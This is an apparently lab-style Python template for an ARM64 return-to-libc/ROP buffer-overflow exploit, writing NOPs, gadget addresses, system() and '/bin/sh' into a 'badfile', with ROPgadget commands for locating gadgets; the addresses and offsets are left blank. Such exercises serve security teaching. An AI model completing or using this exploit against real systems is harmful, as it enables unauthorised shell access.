#!/usr/bin/python3
import sys

addr_libc =                     # The address of libc   <---   info proc mappings
addr_system =                   # The address of system() 
addr_binsh =                    # The address of "/bin/sh"    
addr_gadget_one = addr_libc+    # Gadget for "ldp x21, x30, [sp, #0x10] ; ldp x19, x20, [sp], #0x20 ; ret"  --> $ ROPgadget --binary /lib/aarch64-linux-gnu/libc.so.6 --multibr | grep "ldp x21, x30, \[sp, #0x10\] ; ldp x19, x20, \[sp\], #0x20 ; ret"
addr_gadget_two = addr_libc+    # Gadget for "mov x0, x21 ; blr x20" -->  $ ROPgadget --binary /lib/aarch64-linux-gnu/libc.so.6 --multibr | grep "mov x0, x21 ; blr x20"

# Fill the content with NOPs (ARM64 no-op instruction is `0xD503201F`)
NOP = b"\x1f\x20\x03\xd5"
content = bytearray(NOP * 40)

start=
content[] = (addr_gadget_one).to_bytes(8, byteorder='little')
content[] = (addr_system).to_bytes(8, byteorder='little')
content[] = (addr_binsh).to_bytes(8, byteorder='little')
content[] = (addr_gadget_two).to_bytes(8, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)
